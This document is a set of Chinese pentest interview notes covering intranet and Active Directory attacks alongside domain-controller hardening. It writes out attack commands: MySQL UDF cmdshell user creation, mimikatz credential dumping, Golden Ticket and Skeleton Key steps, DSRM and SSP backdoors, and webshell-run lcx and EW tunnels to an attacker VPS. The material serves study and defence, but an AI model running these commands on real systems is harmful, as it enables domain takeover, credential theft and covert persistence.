11、Perl 安全性测试（低版本可以直接执行系统命令）

### 提权后的操作 密码抓取

BPD

上传BrowserPasswordDump.exe 并启动

WCE(xp、2003、vista、2007、2008下)

将哈希值导出

摘取后注入 （wce路径下执行 wce.exe -s +hash ）

用dir \domain\c$查看 列出文件（wce路径下）

#### Mimikatz

Privilege::debug查看权限

Sekurlsa::logonpasswords获取账户密码信息

### udf 提权有什么限制条件？

（1）MySQL 数据库没有开启安全模式（确认 secure_file_priv = ''是否为空）。

（2）已知的数据库账号具有对 MySQL 数据库 insert 和 delete 的权限，最好是 root 最高权 限。

（3）shell 有写入到数据库安装目录的权限

### UDF提权原理

已知root账号和密码，利用root权限，创建带有调用cmd函数的"udf.dll”。当我们把udf.dll导出指定文件夹引入mysql时候，其中的调用函数拿出来当作mysql函数来使用

mysql版本小于5.1版本，udf.dll文件在windows2003下放在：c:\windows\system32。在windows2000放在：c:\winnt\system32

mysql版本大于5.1版本，udf.dll文件必须放置在mysql安装目录下的lib\plugin。但是大于5.1版本的时候没有plugin这个文件夹，需要自己创建。

利用udf文件加载函数执行命令

create function cmdshell returns string soname 'udf.dll'; //returns string soname ‘导出的DLL路径’；

select cmdshell('net user ndsec ndsecpw /add');

select cmdshell('net localgroup administrators ndsec /add');

drop function cmdshell;

# 内网渗透

## 你是如何做内网渗透的？

在具备有webshell 的情况下，通过webshell直接上传CS木马到对方服务器运行，在CS软件上面开启SocksProxy代理，把kail直接通过CS socksProxy代理 攻击内网进行横向渗透

通过reGeorg+Proxifier进行内网渗透，把tunnel.nosocket.php脚本通过webshell上传到web站点目录进行访问，在本地自己电脑上面执行reGeorgSocksProxy.py -p 9999 -u http://IP地址/tunnel.nosocket.php,最后配置Proxifier本地代理地址与端口进行横向渗透

扫出445端口尝试ms17-010（永恒之蓝）（永恒浪漫）

3389端口 尝试 CVE-2019-0708

内网横向渗透一般攻击技巧有：

\1. 通过nmap、nessus扫描整个内网ip主机漏洞，比如ms08-067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝2代、cve-2017-7494（samba）、cve-2014-6271（破壳）、phpcgi等相关漏洞

\2. 通过nmap扫内网80、8080端口，看内网是否存在大量web站点，如果存在就进行手工或工具对web站点进行漏洞检测，如注入、命令执行、反序列化、文件上传弱口令等相关漏洞

\3. 通过ntscan、Bruter、hydra工具对内网进行弱口令探测。如果发现一个服务器弱口令，可以通过这个弱口令跑整个内网，一般密码一样

\4. 适当的对内网主机进行ARP抓取密码

\5. 如果内网有AD域的情况下，可以通过MS14-068漏洞、黄金票据、白银票据进行域控攻击，拿下域控就等于基本拿下整个内网

## 外网到内网渗透你是怎么做的？

对企业进行信息收集，收集后进行web及系统漏洞扫描，无漏洞情况下，进行手工挖掘，比如：sql注入、xss、弱口令、命令执行这些漏洞拿到webshell，然后进行操作系统提权，

比如：windows的话通过补丁号到github找利用poc提权，

Linux的话利用脏牛提权，suid提权、sudo提权

数据库通过UDF、mof、启动项提权或者第三方软件提权

也可以通过系统劫持提权，在经常更新的目录进行劫持，拿到系统服务器权限之后，如果可以通内网的情况下。用毒液或Frp建立反向代理打通内网，用mimikazt获取当前账户密码，然后生成密码字典扫其他内网服务器的密码，可以通过psexec工具链接内网，也可以搜索信息看内网开通了哪些端口，根据端口漏洞进行内网渗透攻击

## 内网渗透实际案例

杀软识别

\1. 拿到一台机器 tasklist /svc先看是否有杀毒软件

\2. 比如探测发现360，把准备好的bypass360马子扔上去，上线CS

隧道搭建

\1. Ping下机器是否可以通网，可以上frp搭建反向代理隧道

\2. Proxifier配置相应的端口账密便可以进入内网

横向思路

优先拿运维机器，一般存放大量的账户密码信息

其次是集权设备，Vcenter、堡垒机、天擎这些，有day上day，没day寻找其他方法

有域的情况下，争取拿到域管hash，或者通知已知漏洞拿下域控

横向移动

先通过netspy筛选可达网段再进行扫描（netspy是一款快速探测内网可达网段工具）

接着上fscan对可达各个C端开扫，追求效率可只扫描22、80、443、445、1433、8080等重要点端口

扫描会引起安全设备告警，因此横向一个小时内结束，避免入口机器被关机下线，对于拿到的机器可以通过计划任务进行维权，尽可能多拿几台机器保证口子不会掉，拿到机器后继续做信息搜集，网段，机器信息，敏感文件，xshell、navicat密码等常规的这里就不细说了

## 内网服务器，如何进行信息收集？

使用脚本收集：端口信息、服务信息

系统命令收集：域内用户可使用域命令收集域信息，net group "domain users" /domain等

端口扫描工具全段扫描

本机信息收集：管理密码、登录日志看管理员ip、服务密码收集、网段信息查看、历史记录查看

内网DNS域传送漏洞

## 如果拿下了内网边界层的某一个机器，如何对内网其他进行探测？

首先使用代理进入内网reg、ew等

第二在本机进行信息收集，包括管理员ip、端口服务、账号密码、路由信息、网段信息等

第三扩展到收集到的网段进行渗透，利用常用服务:SMB、MYSQL、SQLserver、ftp、telnet等

借助轻量化脚本或扫描器扫描，但一般不这么做，动静太大容易被管理员发现

## 在有杀软拦截，CS无法上线的情况下如何进行横向移动

一般使用todesk和向日葵这两个远控工具进行横向移动

现在比较火的是GoToHTTP（但是需要管理员权限运行，一些行为会加载驱动，运行时360安全卫士会拦截这行为）

RustDesk 通过webshell上传rustdesk 找配置文件 ：C:\user\用户名\AppDate\Roaming\RustDesk\config

获取id和密码

成功连接

# 内网端口转发

### 1、LCX端口转发

前提是端口转发的时候需要一台公网服务器

攻击者有一个公网IP地址

对方处于内网 你有一个公网IP地址

通过菜刀、蚁剑等工具把lcx.exe工具上传到指定目录下

在菜刀Webshell上执行：lcx.exe -slave 自己的公网ip 2222 127.0.0.1 3389 （将本机3389端口流量转发到公网ip的2222端口上去）（自己的公网ip最好到阿里上买vps）

3389端口 也是通过菜刀把工具上传到对方电脑目录下 ，然后再webshell执行

在自己电脑里面执行：lcx.exe -listen 2222 4444 (监听本地的2222端口将流量转发到4444)

连接远程服务 127.0.0.1:4444

### 2、服务器处于内网如何远程连接

攻击者没有公网ip 都处于内网

通过脚本reDuh

先把脚本reDuh.php通过哥斯拉 上传到对方目录下

打开软件，把地址填写在软件中

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps69.jpg)

再连接远程桌面

### 3、内网到内网渗透（reGeorg+Proxifier）

在拿到webshell的情况下 通过菜刀上传tunnel.nosocket.php 到目标机器下

浏览器上输入http://ip对方内网地址 + tunnel.nosocket.php

本机执行cmd ：

Python reGeorgSocksProxy.py -p 9999 -u http://ip对方内网地址 + tunnel.nosocket.php

使用软件Proxifier代理

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps70.jpg)

代理规则走Localhost 走SOCKS5 python.exe 走Direct

Socks5不支持ping协议

需要通过浏览器进行测试内网和内网通没通 10.0.0.3:8080

并且可以暴力破解

### 4、EW（毒液）+sockscap64

正向代理：

通过菜刀上传ew.exe，通过webshell执行ew.exe -s ssocksd -l 1080 （端口可自定义）

在本机上启动代理软件sockscap，在代理管理器配置对方外网ip地址

（启动本机软件需要右键在隧道中启动软件）

通过浏览器可ping内网网段是否打通

反向代理：

目标主机没有公网ip，可使用反向代理

在公网VPS（1.1.1.1）上建立一个转接隧道，将VPS 1080端口监听转发到888端口，然后目标主机主动连接我们VPS的888端口。

然后我们就可以通过设置代理为VPS的1080端口建立一条通往目标主机内网的socks隧道

目标机器：Webshell执行ew.exe,输入./ew -s rssocks -d 物理机ip地址 -e 888

VPS（物理机）：cmd执行ew.exe -s rcsocks -l 1080 -e 888

代理软件sockscap 代理管理配置 127.0.0.1 1080端口

内网的内网

服务器A能出网，服务器B不能出网，但是服务器B可以访问服务器C，服务器A不能访问到服务器C，但是能通服务器B

# 域控（简称AD）

域控是什么：

域控官方一点来说就是活动目录的存储位置，就是用来管理多个域用户计算机的

怎么定位域控：

执行命令ipconfig /all和systeminfo都可以看到域控

内网管理：比如有一万台电脑需要打补丁，安装软件 通过域控下发安装 建立账户 分配密码 组策略安全加固

配置静态ip地址 搭建域服务

### 域渗透

方法1：通过ms14-068漏洞伪造域管的TGT，将普通用户权限提权未域管权限，从而控制域控。

方法2：黄金票据 （伪造TGT） 通过whoami /user 查看SID号

通过工具mimikatz.exe（privilege::debug 开启特权模式 —— lsadump::lsa /patch）获取krbtgt用户hash，再制作黄金票据，通过工具进行票据传递（kerberos::ptt ticket.kirbi）,再通过工具PsExec64.exe 访问域控机器 配一个CS木马执行

通过MS14068漏洞获取Krbtgt用户

白银票据就是伪造ST

所需条件：目标服务器名 可利用的服务 服务账号的NTML HASH 需要伪造的用户名

SID和所处域

Whoami /user

Net config worktation

任何票据制作先清空其他票据 klist purge 通过工具mimikatz制作票据

黄金票据大法

MS14068的漏洞原理：伪造域管的tgt

黄金票据的漏洞原理：伪造krbtgt用户的票据，krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户

黄金票据的条件要求：

域名称hacker.com

域的SID值

域的KRBTGT账户NTLM密码哈希或者aes-256值

MS14-068的利用条件?

获取域普通用户的账号密码

获取域普通用户的sid  whoami /all 查询sid

服务器未打KB3011780补丁 systeminfo 查看是否打补丁

### 域渗透：内网黄金票据、白银票据的区别和利用方式

（1）白银票据：抓取到了域控服务 hash 的情况下，在客户端以一个普通域 用户的身份生成 TGS 票据，并且是针对于某个机器上的某个服务的，生成的 白银票据,只能访问指定的 target 机器中指定的服务。

黄金票据：直接抓取域控中账号的 hash，来在 client 端生成一个 TGT 票 据，那么该票据是针对所有机器的所有服务。

（2）通过 mimkatz 执行，导出域控中账号的 Hash

### 工作组都是windows10有啥渗透思路？

密码喷洒 爆破Hash 内网资产 比如sqlserver redis未授权 jenkends未授权 fscan一把锁哈

内网投毒，cve2021-1675（CVE-2021-1675（Windows Print Spooler 远程代码执行漏洞））

### 金票和银票的区别

获取的权限不同

金票：伪造的TGT，可以获取任意Kerberos的访问权限

银票：伪造的ST，只能访问指定的服务，如CIFS

认证流程不同

金票：同KDC交互，但不同AS交互

银票：不同KDC交互，直接访问Server

加密方式不同

金票：由krbtgt NTLM Hash 加密

银票：由服务账号 NTLM Hash 加密

### DSRM域后门

获取域控权限

查看NTLM Hash

使用mimikatz查看krbtgt的NTLM Hash

privilege::debug

lsadump::lsa /patch /name:krbtgt

查看到NTLM为: 3904c927824bc89365275bde17a1f115

再分别输入如下命令，查看SAM文件中本地管理员的NTLM Hash

token::elevate

lsadump::sam

查看到NTLM为：3f57163975979b7a85ff54a641a63b2d

同步NTLM Hash

将DSRM账号和 krbtgt的 NTLM Hash同步

当显示已成功同步密码后，就可以了

验证一下是否成功了，使用mimikatz分别抓取krbtgt的NTLM Hash和administrator的NTLM Hash

修改DSRM账户登录方式

在注册表中HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa新建DsrmAdminLogonBehavior项（DWORD32位）

0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号

1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器

2：在任何情况下，都可以使用DSRM管理员账号登录域控制器

将这个值修改为2，这样在任何情况下，都可以使用DSRM管理员账号登录域控制器

### SSP维持域控权限

使用mimikatz将伪造的SSP注入内存

域控用户重新登录，那么密码就会被记录在 C:\Windows\System32\mimilsa.log 中

将 mimikatz中的 mimilib.dll放到系统目录

修改注册表 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa 的 Security Packages 项，将下面的命令添加进去，让其加载新的DLL文件"mimilib.dll"

系统重启后，DLL将会被成功加载，用户在登录时输入的账号密码将会被记录在 C:\Windows\System32\kiwissp.log中

系统重启后，DLL将会被成功加载，用户在登录时输入的账号密码将会被记录在 C:\Windows\System32\kiwissp.log中

### SID History 域后门

首先创建一个恶意用户testuser，使用powershell查看用户的SID History

在域控上使用mimikatz来操作， 将域管理员Administrator的SID添加到恶意域用户testuser的SID History属性中。

### 万能密码Skeleton Key

域控制器中使用mimikatz注入Skeleton Key

privilege::debug

misc::skeleton

会在域内的所有账号中添加一个 Skeleton Key其密码默认为" mimikatz"。接下来，就可以以域内任意用户的身份，配合该 Skeleton Key,进行域内身份授权验证了

使用低权限用户测试

net use \\dc\ipc$ "mimikatz"/user:administrator

### 黄金票据(Golden Ticket Attack)防御

1.限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机。这降低攻击者通过横向扩展，获取域管理员的账户，获得访问域控制器的Active Directory的ntds.dit的权限。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。

2.建议定期更改KRBTGT密码。更改一次，然后让AD备份，并在12到24小时后再次更改它。这个过程应该对系统环境没有影响。这个过程应该是确保KRBTGT密码每年至少更改一次的标准方法。

3.一旦攻击者获得了KRBTGT帐号密码哈希的访问权限，就可以随意创建黄金票据。通过快速更改KRBTGT密码两次，使任何现有的黄金票据（以及所有活动的Kerberos票据）失效。这将使所有Kerberos票据无效，并消除攻击者使用其KRBTGT创建有效金票的能力。

4.侦测监视异常的Kerberos活动，例如Windows登录/注销事件（事件ID 4624、4672、4634）中的格式错误或空白字段，TGT中的RC4加密以及TGS请求，而无需前面的TGT请求。监视TGT票证的生存期，以获取与默认域持续时间不同的值。

# 域控如何加固？

### 1、windows基线加固

搭建AD 域控请优先选择windows 2016 Server 及以上版本。这样可以不用care历史漏洞，比如MS14-068，MS17-010以及Gpp漏洞等；

关闭高危服务。禁用Remote Registry、Print Spooler、Windows Remote Management (WS-Management)、Internet Connection Sharing (ICS)等；

安装杀毒软件和EDR工具。建议安装类似SEP、BitDefender之类的杀毒工具，以及sysmon服务(sysmon生成日志策略见https://github.com/SwiftOnSecurity/sysmon-config)；

配置WSUS。设置WSUS指向企业内部补丁更新平台，月度定期安装最新补丁；针对域控常见的漏洞，见附录1.

设置屏幕保护。设置15分钟，超过即锁屏，恢复时须密码；

### 2、域控运维加固

登录来源限制跳板机

网络防火墙限制指定跳板机运维。域控的运维仅允许通过跳板机可以访问，即跳板机ip:any==>域控IP:3389;  其他来源访问域控3389端口禁止；

跳板机开启审计录屏操作。安全审核人员定期审核针对域控的录屏内容，确保无运维之外的高危操作；

主机防火墙设置

开启window主机防火墙。针对域网络、专用网络、公用网络启用服务器

### 3、白名单工具运维（慎重设置）

通过系统自带的AppLocker限制软件为运维需要配置的脚本、工具和应用程序，并定期更新白名单软件 。

从【本地计算机策略】==&gt;【计算机配置】==>【Windows设置】==&gt;【安全设置】==>【应用程序控制策略】==>【Applocker】进行设置。Applocker设置需要不断调试，建议优先在测试环境进行。设置思路如下：

操作系统启动后，经过15分钟后，看下任务管理器，看当前系统依赖的进程名单和路径，将其加到Applocker名单中；

cmd、powershell命令仅允许域控管理员指定帐号可以运行；

添加运维人员经常使用的工具，加入到Applocker名单中；

### 4、域控账户加固

#### 基本配置：账号密码策略

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps71.jpg)

#### 基础配置：最小化权限配置

在域控上对加入域的机器 OU，应用以下策略：

【默认域控策略】==&gt;【计算机配置】==>【Windows设置】==&gt;【安全设置】==>【本地策略】==>【用户权限分配】中配置

拒绝从网络访问这台计算机

TEST.COM\Administrator,TEST.COM\Administrators,TEST.COM\Enterprise Admins,TEST.COM\Domain Admins

拒绝作为批处理作业登录

TEST.COM\Administrator,TEST.COM\Administrators,TEST.COM\Enterprise Admins,TEST.COM\Domain Admins

拒绝以服务身份登录

TEST.COM\Administrator,TEST.COM\Administrators,TEST.COM\Enterprise Admins,TEST.COM\Domain Admins

拒绝本地登录

TEST.COM\Enterprise Admins,TEST.COM\Domain Admins

拒绝通过远程桌面服务登录

TEST.COM\Administrator,TEST.COM\Enterprise Admins,TEST.COM\Domain Admins

在域控对应的父域中，即林中针对域控制器的OU，应用以下策略，在保障安全权限最小化的情况下，也便于管理员组的成员可以执行林范围内的灾难恢复。

从网络访问此计算机

Administrators,ENTERPRISE DOMAIN CONTROLLERS,Parent.COM\Enterprise Admins

允许本地登录

Administrators,ENTERPRISE DOMAIN CONTROLLERS,Parent.COM\Enterprise Admins

允许通过远程桌面服务登录

Administrators,Parent.COM\Enterprise Admins

#### 基本配置：组策略配置

在本地组策略以及GPO策略中，设置路径【计算机配置】==&gt;【Windows设置】==>【安全设置】==&gt;【本地策略】==>【安全选项】，配置如下

"帐户来宾账户状态"设置为: 已禁用；

"账户：使用空密码的本地账户只允许控制台登陆"设置为:已启用。

"Microsoft 网络服务器:暂停会话前所需的空闲时间数量" 设置为:15分钟；

"登陆时间过期后断开与客户端的连接"设置为:已启用；

"交互式登录: 提示用户在密码过期之前更改密码" 设置为5天；

网络访问中"Everyone权限应用于匿名用户"设置为：已禁用;

"不允许SAM帐户的匿名枚举"设置为：已启用;

"不允许SAM帐户和共享的匿名枚举”设置为：已启用;

”允许匿名SID/名称转换"设置为：已禁用;

#### 基本配置：krbtgt帐号设置超长密码，并禁用

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps72.jpg)

#### 进阶配置：以下高敏感帐号，禁止设置委派；

隶属于以下组中的帐号

Enterprise Admins

Domain Admins

Schema Admins

Key Admins

Enterprise Key Admins

Administrators

Krbtgt

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps73.jpg)

#### 进阶配置：帐号分离

\1) 运维域控的帐号独立命名。如a_zhangsan、a_lisi, 禁止使用administrator帐号进行运维；

\2) 运维入域的服务器（如sharepoint、sqlserver或是exchange服务），单独设置命名帐号，如s_wangwu、s_zhaoliu等，且避免将该类帐号加入到上述4.5中列举的高敏感帐号组中；

#### 进阶配置：禁止普通用户配SeEnableDelegationPrivilege权限；

一旦获取到有SeEnableDelegationPrivilege权限的用户，即意味着整个域控被拿下。

【默认域控策略】==&gt;【计算机配置】==>【Windows设置】==&gt;【安全设置】==>【本地策略】==>【用户权限分配】中配置如下

#### 进阶配置：指定的域管帐号具备有dcsync权限；

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps74.jpg)

### 5、配置审核策略

\1) 基本配置：对安全日志、sysmon日志, 设置日志大小至少1048576KB（即1GB）；

设置路径：【管理工具】==>【事件查看器】 分别在安全日志、Sysmon日志上右键–>属性

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps75.jpg)

2）基本配置：配置高级审核策略，以下9个审核策略全部启用，并勾选成功和失败；

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps76.jpg)

### 6、定期人工审计

\1) 企业安全审计人员定期审计上述配置的有效性；

\2) 谈到域控方面的安全审计，这里不得不提下国外Trimarc公司的创始人Sean Metcalf撰写的审计脚本Invoke-TrimarcADChecks.ps1（详情见其官网https://www.hub.trimarcsecurity.com/post/securing-active-directory-performing-an-active-directory-security-review），拜读下代码内容，结合自己企业环境做些定制化修改，相信会对域控的审计有很大的帮助

# 代码审计

## 1、PHP代码审计中容易出问题的点？

参数拼接方式皆有可能产生SQL注入（老生常谈）

全局变量注册导致的变量覆盖

fwrite参数未过滤导致的代码执行

权限校验疏漏导致的后台功能访问

接口任意文件上传

unserialize反序列化漏洞

## 2、JAVA审计思路

\1. 接口排查

先查看项目的开发框架、根据框架特性查找所有的API接口，然后查看从接口接收的参数，并跟踪参数,判断参数数据进入的每一个代码逻辑是否有可利用的点

\1. 危险函数

根据危险函数逆向追踪参数传递，大多数漏洞的产生是因为函数的使用不当导致的，只要找到这些函数,就能够快速挖掘想要的漏洞。

\1. 功能点审计

根据经验判断该类应用通常会在哪些功能中出现漏洞，直接审计该类功能的代码。

\1. 第三方组件、中间件版本

在源码中的pom.xml或Libraries中查看应用是否使用了带有已知漏洞的第三方组件或中间件。

\1. 工具+人工

对于某些漏洞，使用代码静态扫描工具代替人工可以显著提高效率。但是工具的误报率高，还需要人工去确认。

一般常用的工具有：Fortify

PHP用Seay源代码审计系统 RIPS

JAVA用 FindBugs IDEA Android Lint

## 3、PHP代码审计如何查找SSRF漏洞，或SSRF相关的函数是什么

关注对外发起请求的自定义功能函数，如：分析、转码、在线翻译、图片加载下载、收藏。

函数：file_get_contents(),fsockopen(),curl_exec()

## 4、说说你是如何做代码审计的

一般我是采用人工审核和静态分析工具辅助的方式进行。

手工代码审计流程： 1、通读全文代码，从功能函数代码开始阅读，例如 include 文件夹下的 common_fun.php，或者有类似关键字的文件。

一般我是直接通过 x_search 查涵数快速 找漏洞，

如 sql 注入关键字: select、insert、update、$_GET$_POST、$_REQUEST

上传漏洞关键字: $_FILES 、move_uploaded_file

执行漏洞关键字: shell_exec、exec、passthru system、popen

包含漏洞关键字: include、include_once、require、require_once

变量覆盖关键字: $$

跨站漏洞关键字: echo、print、print_r、var_dump、var_exprot,insert

2、看配置文件，带有 config 关键字的文件，找到 mysql.class.php 文件的 connect() 函数，查看在数据库连接时是否出现漏洞。

3、继续跟读首页文件 index.php,了解程序运作时调用了哪些函数和文件 以 index.php 文件作为标线，一层一层去扩展阅读所包含的文件，了解其功能，之后进入 其功能文件夹的首页文件，进行扩展阅读。

工具的话直接采用 HP_Fortify 静态分析工具直接导入源代码进行分析就可以。

一般常用的工具有：Fortify

PHP用Seay源代码审计系统 RIPS

JAVA用 FindBugs IDEA

## 5、使用过的工具、checkmarx工具自定义过规则没，规则里字段的意思？

自定义规则：

checkmarks的规则就是一个一个的查询，这个查询定义了如何从数据流网中找到我们关心的数据流。

checkmarks内置了大量的函数，100多个吧，我们利用这种函数找到我们关心的数据流的起点，终点。当然也可以的定义过滤点，比如某个安全API的调用作为一个过滤点，过滤掉已经修复了安全问题的数据流。

# APP和小程序

### APP面临的危险

客户端（移动APP）主要面临的威胁包括反编译、调试、篡改/重打包、输入记录、组件安全、注入和Hook、本地敏感数据泄露等。

### 常用的反编译工具

常见的反编译工具有IDA Pro及相关Decompiler插件、Radare2 、Ghidra、JD-GUI、Smali/Baksmali、dex2jar、Hopper等等

### 常用的APP调试工具

常见的APP调试工具有IDA Pro、GDB、LLDB、ADB、JDB和Cycript等。

### 常用抓包工具

Wireshark、Burpsuite、Fiddler、Charles

### 小程序的渗透和普通渗透的差异

渗透过程不变，依旧是抓包修改参数渗透

不同点是小程序会将包下载到本地，可以使用逆向还原工具反编译

### app本身的漏洞测试 四大组件

Activity组件:

activity绑定browserable与自定义协议

ActivityManager漏洞

Service组件:

权限提升，拒绝服务攻击

Broadcast Receiver组件:

权限管理不当

BroadcastReceiver导出漏洞

动态注册广播组件暴露漏洞

Content Provider组件:

读写权限漏洞

Content Provider中的SQL注入漏洞

Provider文件目录遍历漏洞

### APP渗透流程

一台安卓机或者安卓模拟器 burp配置代理

打开目标APP

## APP渗透测试流程

渗透测试的最终目的是帮助目标APP或系统发现并修复安全漏洞，提升APP或系统安全性。

### 准备阶段

定义安全测试的范围，包括确认适用的安全控制点、受测方的测试目标和敏感数据。同时在开展渗透测试前，有被测单位的书面盖章渗透测试授权。

### 信息收集

收集包括APP的环境、业务用例和架构等信息。其中：

（1）环境信息如APP的业务功能、行业分类、开发或运营组织的基本信息和工作流程等；

（2）架构信息包括APP本身（如何访问数据和资源、是否检测自身运行在root或模拟环境中等）、APP适用的操作系统及版本、与服务端的通信协议（是否使用安全传输协议、是否有其他安全防护措施等）和远程服务（APP使用哪些远程服务、这些远程服务被攻击是否会影响APP）等。

这些信息大致分为开发或运营组织的信息和APP相关技术信息两大类，一般前者可由商务人员负责去收集，后者可由技术人员收集。

### 应用描绘

根据前2个阶段收集的资料（亦可通过自动扫描、手动分析APP来进行相应补充），测试人员已较为全面的了解受测APP的环境、业务用例和架构等信息，并基本确定了受测APP的渗透测试入口点、收集存储的数据和可能潜在的安全漏洞，即可根据这些漏洞风险等级高低，对其进行排序，以便测试人员确定渗透测试的攻击路径，并制定相应的测试用例。

### 漏洞利用和测试工具开发

在此阶段，测试人员将尝试利用前一阶段发现的漏洞，对应用程序进行渗透，以验证发现的漏洞是否真实、有效，同时在漏洞验证过程中可能涉及测试工具、脚本的开发；该阶段在APP渗透测试的整个过程中是非常必要和关键的一环。

### 提交报告

将已经验证后的漏洞形成报告，提交客户。报告内容至少应包括详细的漏洞名称、类型、漏洞风险分析、漏洞利用过程和结果、渗透测试过程中非授权访问的数据等。

注：不同类型安全检测除流程上会有差异外，报告内容、形式也会有差别，应根据具体情况具体分析。

## 通过APP以渗透相关服务端的一些思路

在此，假设测试人员仅被授权对APP和相关服务端进行渗透。通常包含5个较为重要的环节，分别是：信息收集、网站/服务端渗透、APP功能分析、第三方SDK分析、账号安全和业务安全分析。

### 信息收集

为达成对服务端的攻击，首先应对服务端进行"定位”。对服务端定位的常用方法有反编译APP、抓包分析、APP相关信息搜索、信息汇总分析等，具体如下：

一是反编译APP。这个过程可能会涉及到对APP进行脱壳等。反编译后，在反编译代码和资源文件中，利用字符串搜索和过滤，搜集所有链接等信息。除HTTP/HTTPS链接外，还应关注是否有FTP、登录凭证（比如邮箱账号，有些APP会发Crash信息等到邮箱）等信息。字符串搜索和过滤可以通过写脚本，或在自动化工具中对扫描规则进行配置等方式来完成。

二是抓包分析。一般移动APP和服务端通信使用HTTP(S)，可使用抓包工具对传输数据进行抓包分析。抓包过程中我们可以手动点击APP中各功能菜单，或利用工具触发APP各种功能，通过抓包工具过滤或定制系统等方式尽量排除非受测APP的网络通信数据干扰（有些URL可能是第三方SDK官方地址，非授权渗透测试目标，应予以过滤）。

三是APP相关信息搜索。

（1）应通过互联网广泛搜索APP相关信息，若能找到其官网，应将其相关的官网、论坛的链接都搜集整理出来，若授权许可，亦可将其纳入到渗透的目标范围内。

（2）寻找该APP的历史版本，因为若该APP当前版本的安全加固措施做得比较到位，对其进行逆向分析较为复杂，但在某个时间节点前的历史版本可能是未加固的。

（3）可能会有其他意想不到的发现。

四是信息汇总分析。通过对收集到的信息综合筛选分析，形成一个信息集，包括但不限于URL、IP、使用的第三方SDK（下面展开说）等信息。

### 网站/服务端渗透

这一阶段，与传统的Web渗透过程相同，测试人员通过各种嗅探工具对信息集中的URL、IP进行嗅探和漏扫，以期发现可能存在的漏洞等，并通过发现的漏洞（不管0day还是nday），尝试获取服务器的权限。

### APP功能分析

试用APP，除了试用一些上传下载、聊天、留言等常用功能外，同时还应关注其相对冷门的功能，因为功能越冷门，开发人员对其的关注就越少，相应的服务端服务存在安全问题的可能性就越大。

### 第三方SDK做分析

无授权，测试人员不能随便对第三方SDK官网开展渗透测试，原因是很多第三方SDK客户端和服务端是配套搭建的，有些部署在SDK官方服务端，有些则部署在SDK使用方（也就是APP官方服务端）。许多SDK官方会对其进行详细的说明，包括功能、部署方式、API等等。对于服务端SDK，测试人员可以将其下载下来（若无法探测到服务端版本号，可根据收集到的APP业务上线日期进行推测，并结合经验和已搜集到的信息，从下载的SDK挑选重要的SDK），对其进行历史漏洞搜索（该工作也可在信息收集环节开展）、扫描和分析，也许会发现一些有用的漏洞（0day最好，nday也要试一试，万一没补呢？）。

### 账号安全和业务安全

这一环节在APP功能分析过程中也可能会涉及，其与渗透获取服务器shell权限可能没太大关系，但其从攻击者的角度来看却非常关键，因为大部分攻击者获取服务器shell权限的目的就是为了获取APP用户的数据或资料，当然也有单纯为了搞破坏和黑客炫技的情况存在。

在这一环节，测试人员要详细分析APP的账号机制和业务逻辑，随着APP官方与黑产对抗的加深，APP的业务逻辑和身份认证机制可能会做的很复杂。同时如果APP是使用用户数量大时间、上线时间比较久，存在账户安全问题（爆破、信息泄露、越权、绑定/换绑逻辑等等）的可能性相对要低很多；同理，越是成熟的业务，存在安全问题的概率就会越低，所以测试人员可以重点关注被测APP中可能存在的冷门或新上线业务。

随着移动APP安全攻防对抗逐渐加强，对其及相关服务端开展渗透测试，必然会越来越多的涉及逆向、调试、数据或流量解密等工作（比如一些逻辑漏洞可通过分析其业务功能、流程发现，但是想实现漏洞利用一般还需进一步逆向和抓包分析）。渗透测试人员和团队应善于使用、定制或开发自动化工具辅助检测以节省时间和人力。

可以想象，一旦攻击者借助APP拿下了服务端，就可以反过来批量攻击APP（或用户），从而形成一个攻击闭环，且攻击者能做的事情还远不止这些！

# 病毒

什么是挖矿呢？

每隔一个时间点，比特币系统会在系统节点上生成一个随机代码，互联网中的所有计算机都可以去寻找此代码，谁找到此代码，就会产生一个区块。而比特币的发行是基于奖励的，每促成一个区块的生成，该节点便获得相应奖励，这样大家就有动力投入资金去维护整个交易网络的正常运行。这个寻找代码获得奖励的过程就是挖矿。但是要计算出符合条件的值需要进行上万亿次的哈希运算，这个过程需要大量的算力，于是部分黑客就会通过入侵服务器的方式来控制别人的计算机帮助自己挖矿。

### 挖矿木马

挖矿木马一般为自动化扫描、攻击、部署挖矿进程的脚本，攻击者首先将挖矿脚本放在远程主机上，通过常见或最新爆出的可命令执行的自动化漏洞利用脚本获得主机的控制权后，登陆主机，利用wget或curl直接下载远程挖矿进程部署脚本，执行脚本进行挖矿进程的部署、隐藏、持久化和痕迹清除等工作。

挖矿流程一般为：

\1. 通过已知漏洞获得主机控制权

\2. 下载远程挖矿脚本

\3. 删除本机中可能存在的其他挖矿进程（可见黑产竞争的激烈程度)

\4. 生成特征文件避免重复感染

\5. 判断主机系统类型和位数，隐藏并运行挖矿进程

\6. 如果有GPU则进行GPU挖矿

\7. 挖矿进程的驻留与持久化

\8. 部分有蠕虫功能的脚本还会以当前主机为跳板，利用已知漏洞和弱口令进行局域网扫描，以控制更多主机。

\9. 清除痕迹

### 被挖矿特征

主机CPU使用率飙升

电费激增

### 清除挖矿木马

在工作中一般就是在不影响业务的前提下及时隔离感染主机

再进行阻断与矿池通讯、清除定时任务（crontab -l 或vim/var/spool/cron/root）

还有就是清除启动项、清除公钥文件、删除残留文件，需要去除属性，然后删除

### 1、中挖矿病毒怎么解决

首先ps -aux查看进程分析

然后top 分析算力，挖矿用到的算力比较多，对流量进行过滤，含有矿池服务器的流量就是挖矿病毒

最后kill进程，rm掉程序

删不掉这么办

